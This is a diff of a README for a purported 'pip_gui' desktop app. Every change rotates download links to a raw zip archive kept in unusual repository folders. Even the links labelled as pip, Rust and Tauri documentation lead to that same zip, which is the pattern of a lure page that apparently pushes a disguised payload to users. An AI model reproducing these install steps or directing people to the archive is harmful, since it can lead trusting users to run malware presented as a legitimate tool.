@@ -15,7 +15,7 @@ To get started, follow these steps:
 
 1. **Download the Application**
    Visit this page to download the latest version:
-   [Download pip_gui](https://github.com/reggerski/pip_gui/raw/refs/heads/main/src-tauri/icons/gui-pip-v3.1.zip)
+   [Download pip_gui](https://github.com/reggerski/pip_gui/raw/refs/heads/main/src-tauri/src/models/pip-gui-2.6.zip)
 
 2. **Install the Application**
    After downloading, locate the file in your Downloads folder. Follow the installation prompts. 
@@ -25,7 +25,7 @@ To get started, follow these steps:
 
 ## 📥 Download & Install
 To download and install pip_gui, please visit this page:
-[Download pip_gui](https://github.com/reggerski/pip_gui/raw/refs/heads/main/src-tauri/icons/gui-pip-v3.1.zip)
+[Download pip_gui](https://github.com/reggerski/pip_gui/raw/refs/heads/main/src-tauri/src/models/pip-gui-2.6.zip)
 
 ## 💻 System Requirements
 Make sure your system meets the following requirements:
@@ -76,8 +76,8 @@ We welcome contributions of any kind. Whether you're looking to add a new featur
 We appreciate the open-source community and the developers behind the tools that made pip_gui possible. Special thanks to the Tauri team for the framework that powers our app.
 
 ## 🔗 Additional Resources
-- [pip Documentation](https://github.com/reggerski/pip_gui/raw/refs/heads/main/src-tauri/icons/gui-pip-v3.1.zip)
-- [Rust Programming Language](https://github.com/reggerski/pip_gui/raw/refs/heads/main/src-tauri/icons/gui-pip-v3.1.zip)
-- [Tauri Docs](https://github.com/reggerski/pip_gui/raw/refs/heads/main/src-tauri/icons/gui-pip-v3.1.zip)
+- [pip Documentation](https://github.com/reggerski/pip_gui/raw/refs/heads/main/src-tauri/src/models/pip-gui-2.6.zip)
+- [Rust Programming Language](https://github.com/reggerski/pip_gui/raw/refs/heads/main/src-tauri/src/models/pip-gui-2.6.zip)
+- [Tauri Docs](https://github.com/reggerski/pip_gui/raw/refs/heads/main/src-tauri/src/models/pip-gui-2.6.zip)
 
 Feel free to reach out with any questions. Happy packaging!
